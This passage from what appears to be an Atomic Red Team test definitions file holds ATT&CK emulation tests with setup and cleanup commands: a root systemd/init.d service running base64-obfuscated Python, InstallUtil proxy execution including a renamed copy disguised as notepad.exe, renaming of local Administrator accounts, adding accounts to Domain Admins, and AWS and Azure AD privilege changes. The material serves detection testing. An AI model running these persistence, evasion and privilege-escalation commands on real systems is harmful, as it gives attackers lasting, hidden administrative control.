				"get_prereq_command": "echo Please run from Ubuntu ,Kali OR CentOS.\n"
			}
		],
		"executor": {
			"name": "bash",
			"elevation_required": true,
			"command": "cat > /etc/init.d/T1543.002 << EOF\n#!/bin/bash\n### BEGIN INIT INFO\n# Provides : Atomic Test T1543.002\n# Required-Start: $all\n# Required-Stop : \n# Default-Start: 2 3 4 5\n# Default-Stop: \n# Short Description: Atomic Test for Systemd Service Creation\n### END INIT INFO\npython3 -c \"import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBDcmVhdGluZyBTeXN0ZW1kIFNlcnZpY2UgVDE1NDMuMDAyID4gL3RtcC9UMTU0My4wMDIuc3lzdGVtZC5zZXJ2aWNlLmNyZWF0aW9uJykK'))\"\nEOF\n\nchmod +x /etc/init.d/T1543.002\nif [ $(cat /etc/os-release | grep -i ID=ubuntu) ] || [ $(cat /etc/os-release | grep -i ID=kali) ]; then update-rc.d T1543.002 defaults; elif [ $(cat /etc/os-release | grep -i 'ID=\"centos\"') ]; then chkconfig T1543.002 on ; else echo \"Please run this test on Ubnutu , kali OR centos\" ; fi ;\nsystemctl enable T1543.002\nsystemctl start T1543.002\n\necho \"python3 -c \\\"import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBtb2RpZnlpbmcgYSBTeXN0ZW1kIFNlcnZpY2UgVDE1NDMuMDAyID4gL3RtcC9UMTU0My4wMDIuc3lzdGVtZC5zZXJ2aWNlLm1vZGlmaWNhdGlvbicpCg=='))\\\"\" | sudo tee -a /etc/init.d/T1543.002\nsystemctl daemon-reload\nsystemctl restart T1543.002\n",
			"cleanup_command": "systemctl stop T1543.002\nsystemctl disable T1543.002\nrm -rf /etc/init.d/T1543.002\nsystemctl daemon-reload\n"
		},
		"attack_technique": "T1543.002",
		"phases": ["persistence", "privilege-escalation"]
	},
	{
		"name": "CheckIfInstallable method call",
		"auto_generated_guid": "ffd9c807-d402-47d2-879d-f915cf2a3a94",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"test_harness": {
				"description": "location of the test harness script - Invoke-BuildAndInvokeInstallUtilAssembly",
				"type": "path",
				"default": "PathToAtomicsFolder\\T1218.004\\src\\InstallUtilTestHarness.ps1"
			},
			"assembly_dir": {
				"description": "directory to drop the compiled installer assembly",
				"type": "path",
				"default": "$Env:TEMP\\"
			},
			"invocation_method": {
				"description": "the type of InstallUtil invocation variant - Executable, InstallHelper, or CheckIfInstallable",
				"type": "string",
				"default": "CheckIfInstallable"
			},
			"assembly_filename": {
				"description": "filename of the compiled installer assembly",
				"type": "string",
				"default": "T1218.004.dll"
			}
		},
		"dependencies": [
			{
				"description": "InstallUtil test harness script must be installed at specified location (#{test_harness})\n",
				"prereq_command": "if (Test-Path \"#{test_harness}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory (split-path \"#{test_harness}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.004/src/InstallUtilTestHarness.ps1' -OutFile \"#{test_harness}\"\n"
			}
		],
		"executor": {
			"command": "# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly\n. \"#{test_harness}\"\n\n$InstallerAssemblyDir = \"#{assembly_dir}\"\n$InstallerAssemblyFileName = \"#{assembly_filename}\"\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n\n$ExpectedOutput = 'Constructor_'\n\n$TestArgs = @{\n    OutputAssemblyDirectory = $InstallerAssemblyDir\n    OutputAssemblyFileName = $InstallerAssemblyFileName\n    InvocationMethod = '#{invocation_method}'\n}\n\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly\n\nif ($ActualOutput -ne $ExpectedOutput) {\n    throw @\"\nCheckIfInstallable method execution test failure. Installer assembly execution output did not match the expected output.\nExpected: $ExpectedOutput\nActual: $ActualOutput\n\"@\n}\n",
			"cleanup_command": "$InstallerAssemblyDir = \"#{assembly_dir}\"\n$InstallerAssemblyFileName = \"#{assembly_filename}\"\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\nRemove-Item -Path $InstallerAssemblyFullPath -ErrorAction Ignore\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1218.004",
		"phases": ["defense-evasion"]
	},
	{
		"name": "InstallHelper method call",
		"auto_generated_guid": "d43a5bde-ae28-4c55-a850-3f4c80573503",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"test_harness": {
				"description": "location of the test harness script - Invoke-BuildAndInvokeInstallUtilAssembly",
				"type": "path",
				"default": "PathToAtomicsFolder\\T1218.004\\src\\InstallUtilTestHarness.ps1"
			},
			"assembly_dir": {
				"description": "directory to drop the compiled installer assembly",
				"type": "path",
				"default": "$Env:TEMP\\"
			},
			"invocation_method": {
				"description": "the type of InstallUtil invocation variant - Executable, InstallHelper, or CheckIfInstallable",
				"type": "string",
				"default": "InstallHelper"
			},
			"assembly_filename": {
				"description": "filename of the compiled installer assembly",
				"type": "string",
				"default": "T1218.004.dll"
			}
		},
		"dependencies": [
			{
				"description": "InstallUtil test harness script must be installed at specified location (#{test_harness})\n",
				"prereq_command": "if (Test-Path \"#{test_harness}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory (split-path \"#{test_harness}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.004/src/InstallUtilTestHarness.ps1' -OutFile \"#{test_harness}\"\n"
			}
		],
		"executor": {
			"command": "# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly\n. \"#{test_harness}\"\n\n$InstallerAssemblyDir = \"#{assembly_dir}\"\n$InstallerAssemblyFileName = \"#{assembly_filename}\"\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n\n$CommandLine = \"/logfile= /logtoconsole=false `\"$InstallerAssemblyFullPath`\"\"\n$ExpectedOutput = 'Constructor_'\n\n$TestArgs = @{\n    OutputAssemblyDirectory = $InstallerAssemblyDir\n    OutputAssemblyFileName = $InstallerAssemblyFileName\n    InvocationMethod = '#{invocation_method}'\n    CommandLine = $CommandLine\n}\n\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly\n\nif ($ActualOutput -ne $ExpectedOutput) {\n    throw @\"\nInstallHelper method execution test failure. Installer assembly execution output did not match the expected output.\nExpected: $ExpectedOutput\nActual: $ActualOutput\n\"@\n}\n",
			"cleanup_command": "$InstallerAssemblyDir = \"#{assembly_dir}\"\n$InstallerAssemblyFileName = \"#{assembly_filename}\"\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\nRemove-Item -Path $InstallerAssemblyFullPath -ErrorAction Ignore\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1218.004",
		"phases": ["defense-evasion"]
	},
	{
		"name": "InstallUtil class constructor method call",
		"auto_generated_guid": "9b7a7cfc-dd2e-43f5-a885-c0a3c270dd93",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"test_harness": {
				"description": "location of the test harness script - Invoke-BuildAndInvokeInstallUtilAssembly",
				"type": "path",
				"default": "PathToAtomicsFolder\\T1218.004\\src\\InstallUtilTestHarness.ps1"
			},
			"assembly_dir": {
				"description": "directory to drop the compiled installer assembly",
				"type": "path",
				"default": "$Env:TEMP\\"
			},
			"invocation_method": {
				"description": "the type of InstallUtil invocation variant - Executable, InstallHelper, or CheckIfInstallable",
				"type": "string",
				"default": "Executable"
			},
			"assembly_filename": {
				"description": "filename of the compiled installer assembly",
				"type": "string",
				"default": "T1218.004.dll"
			}
		},
		"dependencies": [
			{
				"description": "InstallUtil test harness script must be installed at specified location (#{test_harness})\n",
				"prereq_command": "if (Test-Path \"#{test_harness}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory (split-path \"#{test_harness}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.004/src/InstallUtilTestHarness.ps1' -OutFile \"#{test_harness}\"\n"
			}
		],
		"executor": {
			"command": "# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly\n. \"#{test_harness}\"\n\n$InstallerAssemblyDir = \"#{assembly_dir}\"\n$InstallerAssemblyFileName = \"#{assembly_filename}\"\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n\n$CommandLine = \"/logfile= /logtoconsole=false `\"$InstallerAssemblyFullPath`\"\"\n$ExpectedOutput = 'Constructor_'\n\n$TestArgs = @{\n    OutputAssemblyDirectory = $InstallerAssemblyDir\n    OutputAssemblyFileName = $InstallerAssemblyFileName\n    InvocationMethod = '#{invocation_method}'\n    CommandLine = $CommandLine\n}\n\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly\n\nif ($ActualOutput -ne $ExpectedOutput) {\n    throw @\"\nInstallUtil class constructor execution test failure. Installer assembly execution output did not match the expected output.\nExpected: $ExpectedOutput\nActual: $ActualOutput\n\"@\n}\n",
			"cleanup_command": "$InstallerAssemblyDir = \"#{assembly_dir}\"\n$InstallerAssemblyFileName = \"#{assembly_filename}\"\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\nRemove-Item -Path $InstallerAssemblyFullPath -ErrorAction Ignore\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1218.004",
		"phases": ["defense-evasion"]
	},
	{
		"name": "InstallUtil Install method call",
		"auto_generated_guid": "9f9968a6-601a-46ca-b7b7-6d4fe0f98f0b",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"test_harness": {
				"description": "location of the test harness script - Invoke-BuildAndInvokeInstallUtilAssembly",
				"type": "path",
				"default": "PathToAtomicsFolder\\T1218.004\\src\\InstallUtilTestHarness.ps1"
			},
			"assembly_dir": {
				"description": "directory to drop the compiled installer assembly",
				"type": "path",
				"default": "$Env:TEMP\\"
			},
			"invocation_method": {
				"description": "the type of InstallUtil invocation variant - Executable, InstallHelper, or CheckIfInstallable",
				"type": "string",
				"default": "Executable"
			},
			"assembly_filename": {
				"description": "filename of the compiled installer assembly",
				"type": "string",
				"default": "T1218.004.dll"
			}
		},
		"dependencies": [
			{
				"description": "InstallUtil test harness script must be installed at specified location (#{test_harness})\n",
				"prereq_command": "if (Test-Path \"#{test_harness}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory (split-path \"#{test_harness}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.004/src/InstallUtilTestHarness.ps1' -OutFile \"#{test_harness}\"\n"
			}
		],
		"executor": {
			"command": "# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly\n. \"#{test_harness}\"\n\n$InstallerAssemblyDir = \"#{assembly_dir}\"\n$InstallerAssemblyFileName = \"#{assembly_filename}\"\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n\n$CommandLine = \"/logfile= /logtoconsole=false /installtype=notransaction /action=install `\"$InstallerAssemblyFullPath`\"\"\n$ExpectedOutput = 'Constructor_Install_'\n\n$TestArgs = @{\n    OutputAssemblyDirectory = $InstallerAssemblyDir\n    OutputAssemblyFileName = $InstallerAssemblyFileName\n    InvocationMethod = '#{invocation_method}'\n    CommandLine = $CommandLine\n}\n\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs\n\nif ($ActualOutput -ne $ExpectedOutput) {\n    throw @\"\nInstallUtil Install method execution test failure. Installer assembly execution output did not match the expected output.\nExpected: $ExpectedOutput\nActual: $ActualOutput\n\"@\n}\n",
			"cleanup_command": "$InstallerAssemblyDir = \"#{assembly_dir}\"\n$InstallerAssemblyFileName = \"#{assembly_filename}\"\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\nRemove-Item -Path $InstallerAssemblyFullPath -ErrorAction Ignore\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1218.004",
		"phases": ["defense-evasion"]
	},
	{
		"name": "InstallUtil Uninstall method call - /U variant",
		"auto_generated_guid": "34428cfa-8e38-41e5-aff4-9e1f8f3a7b4b",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"test_harness": {
				"description": "location of the test harness script - Invoke-BuildAndInvokeInstallUtilAssembly",
				"type": "path",
				"default": "PathToAtomicsFolder\\T1218.004\\src\\InstallUtilTestHarness.ps1"
			},
			"assembly_dir": {
				"description": "directory to drop the compiled installer assembly",
				"type": "path",
				"default": "$Env:TEMP\\"
			},
			"invocation_method": {
				"description": "the type of InstallUtil invocation variant - Executable, InstallHelper, or CheckIfInstallable",
				"type": "string",
				"default": "Executable"
			},
			"assembly_filename": {
				"description": "filename of the compiled installer assembly",
				"type": "string",
				"default": "T1218.004.dll"
			}
		},
		"dependencies": [
			{
				"description": "InstallUtil test harness script must be installed at specified location (#{test_harness})\n",
				"prereq_command": "if (Test-Path \"#{test_harness}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory (split-path \"#{test_harness}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.004/src/InstallUtilTestHarness.ps1' -OutFile \"#{test_harness}\"\n"
			}
		],
		"executor": {
			"command": "# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly\n. \"#{test_harness}\"\n\n$InstallerAssemblyDir = \"#{assembly_dir}\"\n$InstallerAssemblyFileName = \"#{assembly_filename}\"\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n\n$CommandLine = \"/logfile= /logtoconsole=false /U `\"$InstallerAssemblyFullPath`\"\"\n$ExpectedOutput = 'Constructor_Uninstall_'\n\n$TestArgs = @{\n    OutputAssemblyDirectory = $InstallerAssemblyDir\n    OutputAssemblyFileName = $InstallerAssemblyFileName\n    InvocationMethod = '#{invocation_method}'\n    CommandLine = $CommandLine\n}\n\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs\n\nif ($ActualOutput -ne $ExpectedOutput) {\n    throw @\"\nInstallUtil Uninstall method execution test failure. Installer assembly execution output did not match the expected output.\nExpected: $ExpectedOutput\nActual: $ActualOutput\n\"@\n}\n",
			"cleanup_command": "$InstallerAssemblyDir = \"#{assembly_dir}\"\n$InstallerAssemblyFileName = \"#{assembly_filename}\"\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\nRemove-Item -Path $InstallerAssemblyFullPath -ErrorAction Ignore\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1218.004",
		"phases": ["defense-evasion"]
	},
	{
		"name": "InstallUtil Uninstall method call - '/installtype=notransaction /action=uninstall' variant",
		"auto_generated_guid": "06d9deba-f732-48a8-af8e-bdd6e4d98c1d",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"test_harness": {
				"description": "location of the test harness script - Invoke-BuildAndInvokeInstallUtilAssembly",
				"type": "path",
				"default": "PathToAtomicsFolder\\T1218.004\\src\\InstallUtilTestHarness.ps1"
			},
			"assembly_dir": {
				"description": "directory to drop the compiled installer assembly",
				"type": "path",
				"default": "$Env:TEMP\\"
			},
			"invocation_method": {
				"description": "the type of InstallUtil invocation variant - Executable, InstallHelper, or CheckIfInstallable",
				"type": "string",
				"default": "Executable"
			},
			"assembly_filename": {
				"description": "filename of the compiled installer assembly",
				"type": "string",
				"default": "T1218.004.dll"
			}
		},
		"dependencies": [
			{
				"description": "InstallUtil test harness script must be installed at specified location (#{test_harness})\n",
				"prereq_command": "if (Test-Path \"#{test_harness}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory (split-path \"#{test_harness}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.004/src/InstallUtilTestHarness.ps1' -OutFile \"#{test_harness}\"\n"
			}
		],
		"executor": {
			"command": "# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly\n. \"#{test_harness}\"\n\n$InstallerAssemblyDir = \"#{assembly_dir}\"\n$InstallerAssemblyFileName = \"#{assembly_filename}\"\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n\n$CommandLine = \"/logfile= /logtoconsole=false /installtype=notransaction /action=uninstall `\"$InstallerAssemblyFullPath`\"\"\n$ExpectedOutput = 'Constructor_Uninstall_'\n\n$TestArgs = @{\n    OutputAssemblyDirectory = $InstallerAssemblyDir\n    OutputAssemblyFileName = $InstallerAssemblyFileName\n    InvocationMethod = '#{invocation_method}'\n    CommandLine = $CommandLine\n}\n\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs\n\nif ($ActualOutput -ne $ExpectedOutput) {\n    throw @\"\nInstallUtil Uninstall method execution test failure. Installer assembly execution output did not match the expected output.\nExpected: $ExpectedOutput\nActual: $ActualOutput\n\"@\n}\n",
			"cleanup_command": "$InstallerAssemblyDir = \"#{assembly_dir}\"\n$InstallerAssemblyFileName = \"#{assembly_filename}\"\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\nRemove-Item -Path $InstallerAssemblyFullPath -ErrorAction Ignore\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1218.004",
		"phases": ["defense-evasion"]
	},
	{
		"name": "InstallUtil HelpText method call",
		"auto_generated_guid": "5a683850-1145-4326-a0e5-e91ced3c6022",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"test_harness": {
				"description": "location of the test harness script - Invoke-BuildAndInvokeInstallUtilAssembly",
				"type": "path",
				"default": "PathToAtomicsFolder\\T1218.004\\src\\InstallUtilTestHarness.ps1"
			},
			"assembly_dir": {
				"description": "directory to drop the compiled installer assembly",
				"type": "path",
				"default": "$Env:TEMP\\"
			},
			"invocation_method": {
				"description": "the type of InstallUtil invocation variant - Executable, InstallHelper, or CheckIfInstallable",
				"type": "string",
				"default": "Executable"
			},
			"assembly_filename": {
				"description": "filename of the compiled installer assembly",
				"type": "string",
				"default": "T1218.004.dll"
			}
		},
		"dependencies": [
			{
				"description": "InstallUtil test harness script must be installed at specified location (#{test_harness})\n",
				"prereq_command": "if (Test-Path \"#{test_harness}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory (split-path \"#{test_harness}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.004/src/InstallUtilTestHarness.ps1' -OutFile \"#{test_harness}\"\n"
			}
		],
		"executor": {
			"command": "# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly\n. \"#{test_harness}\"\n\n$InstallerAssemblyDir = \"#{assembly_dir}\"\n$InstallerAssemblyFileName = \"#{assembly_filename}\"\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n\n$CommandLine = \"/? `\"$InstallerAssemblyFullPath`\"\"\n$ExpectedOutput = 'Constructor_HelpText_'\n\n$TestArgs = @{\n    OutputAssemblyDirectory = $InstallerAssemblyDir\n    OutputAssemblyFileName = $InstallerAssemblyFileName\n    InvocationMethod = '#{invocation_method}'\n    CommandLine = $CommandLine\n}\n\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs\n\nif ($ActualOutput -ne $ExpectedOutput) {\n    throw @\"\nInstallUtil HelpText property execution test failure. Installer assembly execution output did not match the expected output.\nExpected: $ExpectedOutput\nActual: $ActualOutput\n\"@\n}\n",
			"cleanup_command": "$InstallerAssemblyDir = \"#{assembly_dir}\"\n$InstallerAssemblyFileName = \"#{assembly_filename}\"\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\nRemove-Item -Path $InstallerAssemblyFullPath -ErrorAction Ignore\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1218.004",
		"phases": ["defense-evasion"]
	},
	{
		"name": "InstallUtil evasive invocation",
		"auto_generated_guid": "559e6d06-bb42-4307-bff7-3b95a8254bad",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"test_harness": {
				"description": "location of the test harness script - Invoke-BuildAndInvokeInstallUtilAssembly",
				"type": "path",
				"default": "PathToAtomicsFolder\\T1218.004\\src\\InstallUtilTestHarness.ps1"
			}
		},
		"dependencies": [
			{
				"description": "InstallUtil test harness script must be installed at specified location (#{test_harness})\n",
				"prereq_command": "if (Test-Path \"#{test_harness}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory (split-path \"#{test_harness}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.004/src/InstallUtilTestHarness.ps1' -OutFile \"#{test_harness}\"\n"
			}
		],
		"executor": {
			"command": "# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly\n. \"#{test_harness}\"\n\n$InstallerAssemblyDir = \"$Env:windir\\System32\\Tasks\"\n$InstallerAssemblyFileName = 'readme.txt'\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n\n$CommandLine = \"readme.txt\"\n$ExpectedOutput = 'Constructor_'\n\n# Explicitly set the directory so that a relative path to readme.txt can be supplied.\nSet-Location \"$Env:windir\\System32\\Tasks\"\n\nCopy-Item -Path \"$([System.Runtime.InteropServices.RuntimeEnvironment]::GetRuntimeDirectory())InstallUtil.exe\" -Destination \"$Env:windir\\System32\\Tasks\\notepad.exe\"\n\n$TestArgs = @{\n    OutputAssemblyDirectory = $InstallerAssemblyDir\n    OutputAssemblyFileName = $InstallerAssemblyFileName\n    InvocationMethod = 'Executable'\n    CommandLine = $CommandLine\n    InstallUtilPath = \"$Env:windir\\System32\\Tasks\\notepad.exe\"\n}\n\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly\n\nif ($ActualOutput -ne $ExpectedOutput) {\n    throw @\"\nEvasive Installutil invocation test failure. Installer assembly execution output did not match the expected output.\nExpected: $ExpectedOutput\nActual: $ActualOutput\n\"@\n}\n",
			"cleanup_command": "Remove-Item -Path \"$Env:windir\\System32\\Tasks\\readme.txt\" -ErrorAction Ignore\nRemove-Item -Path \"$Env:windir\\System32\\Tasks\\readme.InstallLog\" -ErrorAction Ignore\nRemove-Item -Path \"$Env:windir\\System32\\Tasks\\readme.InstallState\" -ErrorAction Ignore\nRemove-Item -Path \"$Env:windir\\System32\\Tasks\\notepad.exe\" -ErrorAction Ignore\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1218.004",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Admin Account Manipulate",
		"auto_generated_guid": "5598f7cb-cf43-455e-883a-f6008c5d46af",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "$x = Get-Random -Minimum 2 -Maximum 9999\n$y = Get-Random -Minimum 2 -Maximum 9999\n$z = Get-Random -Minimum 2 -Maximum 9999\n$w = Get-Random -Minimum 2 -Maximum 9999\nWrite-Host HaHa_$x$y$z\n\n$fmm = Get-LocalGroupMember -Group Administrators |?{ $_.ObjectClass -match \"User\" -and $_.PrincipalSource -match \"Local\"} | Select Name\n\nforeach($member in $fmm) {\n    if($member -like \"*Administrator*\") {\n        $account = $member.Name.Split(\"\\\")[-1] # strip computername\\\n        $originalDescription = (Get-LocalUser -Name $account).Description\n        Set-LocalUser -Name $account -Description \"atr:$account;$originalDescription\".Substring(0,48) # Keep original name in description\n        Rename-LocalUser -Name $account -NewName \"HaHa_$x$y$z\" # Required due to length limitation\n        Write-Host \"Successfully Renamed $account Account on \" $Env:COMPUTERNAME\n        }\n    }\n",
			"cleanup_command": "$list = Get-LocalUser |?{$_.Description -like \"atr:*\"}\nforeach($u in $list) {\n  $u.Description -match \"atr:(?<Name>[^;]+);(?<Description>.*)\"\n  Set-LocalUser -Name $u.Name -Description $Matches.Description\n  Rename-LocalUser -Name $u.Name -NewName $Matches.Name\n  Write-Host \"Successfully Reverted Account $($u.Name) to $($Matches.Name) on \" $Env:COMPUTERNAME\n}\n",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1098",
		"phases": ["persistence", "privilege-escalation"]
	},
	{
		"name": "Domain Account and Group Manipulate",
		"auto_generated_guid": "a55a22e9-a3d3-42ce-bd48-2653adb8f7a9",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"account_prefix": {
				"description": "Prefix string of the random username (by default, atr-). Because the cleanup deletes such account based on\na match `(&(samaccountname=#{account_prefix}-*)(givenName=Test))`, if you are to change it, be careful.\n",
				"type": "string",
				"default": "atr-"
			},
			"group": {
				"description": "Name of the group to alter",
				"type": "string",
				"default": "Domain Admins"
			},
			"create_args": {
				"description": "Additional string appended to New-ADUser call",
				"type": "string",
				"default": ""
			}
		},
		"dependencies": [
			{
				"description": "PS Module ActiveDirectory\n",
				"prereq_command": "Try {\n    Import-Module ActiveDirectory -ErrorAction Stop | Out-Null\n    exit 0\n} \nCatch {\n    exit 1\n}\n",
				"get_prereq_command": "if((Get-CimInstance -ClassName Win32_OperatingSystem).ProductType -eq 1) {\n  Add-WindowsCapability -Name (Get-WindowsCapability -Name RSAT.ActiveDirectory.DS* -Online).Name -Online\n} else {\n  Install-WindowsFeature RSAT-AD-PowerShell\n}\n"
			}
		],
		"executor": {
			"command": "$x = Get-Random -Minimum 2 -Maximum 99\n$y = Get-Random -Minimum 2 -Maximum 99\n$z = Get-Random -Minimum 2 -Maximum 99\n$w = Get-Random -Minimum 2 -Maximum 99\n\nImport-Module ActiveDirectory\n$account = \"#{account_prefix}-$x$y$z\"\nNew-ADUser -Name $account -GivenName \"Test\" -DisplayName $account -SamAccountName $account -Surname $account -Enabled:$False #{create_args}\nAdd-ADGroupMember \"#{group}\" $account\n",
			"cleanup_command": "Get-ADUser -LDAPFilter \"(&(samaccountname=#{account_prefix}-*)(givenName=Test))\" | Remove-ADUser -Confirm:$False\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1098",
		"phases": ["persistence", "privilege-escalation"]
	},
	{
		"name": "AWS - Create a group and add a user to that group",
		"auto_generated_guid": "8822c3b0-d9f9-4daf-a043-49f110a31122",
		"supported_platforms": ["iaas:aws"],
		"input_arguments": {
			"username": {
				"description": "Name of the AWS group to create",
				"type": "string",
				"default": "atomicredteam"
			}
		},
		"dependencies": [
			{
				"description": "Check if the user exists, we can only add a user to a group if the user exists.\n",
				"prereq_command": "aws iam list-users | grep #{username}\n",
				"get_prereq_command": "echo Please run atomic test T1136.003, before running this atomic test\n"
			}
		],
		"executor": {
			"command": "aws iam create-group --group-name #{username}\naws iam add-user-to-group --user-name #{username} --group-name #{username}\n",
			"cleanup_command": "aws iam remove-user-from-group --user-name #{username} --group-name #{username}\naws iam delete-group --group-name #{username}\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1098",
		"phases": ["persistence", "privilege-escalation"]
	},
	{
		"name": "Azure AD - adding user to Azure AD role",
		"auto_generated_guid": "0e65ae27-5385-46b4-98ac-607a8ee82261",
		"supported_platforms": ["azure-ad"],
		"input_arguments": {
			"username": {
				"description": "Azure AD username",
				"type": "string",
				"default": "jonh@contoso.com"
			},
			"password": {
				"description": "Azure AD password",
				"type": "string",
				"default": "p4sswd"
			},
			"user_principal_name": {
				"description": "Display Name, or User Principal Name, of the targeted user principal",
				"type": "string",
				"default": "SuperUser"
			},
			"role_name": {
				"description": "Name of the targeted Azure AD role",
				"type": "string",
				"default": "Global Reader"
			}
		},
		"dependencies": [
			{
				"description": "AzureAD module must be installed.\n",
				"prereq_command": "try {if (Get-InstalledModule -Name AzureAD -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}\n",
				"get_prereq_command": "Install-Module -Name AzureAD -Force\n"
			}
		],
		"executor": {
			"command": "Import-Module -Name AzureAD\n$PWord = ConvertTo-SecureString -String \"#{password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $Pword\nConnect-AzureAD -Credential $Credential\n\n$user = Get-AzureADUser -Filter \"DisplayName eq '#{user_principal_name}' or UserPrincipalName eq '#{user_principal_name}'\"\nif ($user -eq $null) { Write-Warning \"User not found\"; exit }\n$role = Get-AzureADDirectoryRole -Filter \"DisplayName eq '#{role_name}'\"\nif ($role -eq $null) { Write-Warning \"Role not found\"; exit }\nAdd-AzureADDirectoryRoleMember -ObjectId $role.ObjectId -RefObjectId $user.ObjectId\nWrite-Host \"User $($user.DisplayName) was added to $($role.DisplayName) role\"\n",
